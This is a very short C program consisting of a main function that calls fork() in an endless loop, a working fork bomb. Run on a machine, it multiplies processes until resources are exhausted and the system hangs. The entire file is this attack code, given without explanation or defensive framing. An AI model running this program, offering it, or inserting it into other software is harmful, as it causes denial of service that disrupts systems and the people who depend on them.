#include <unistd.h>
#include <stdlib.h>
main()
{
	while (fork() >= 0)
		;
}
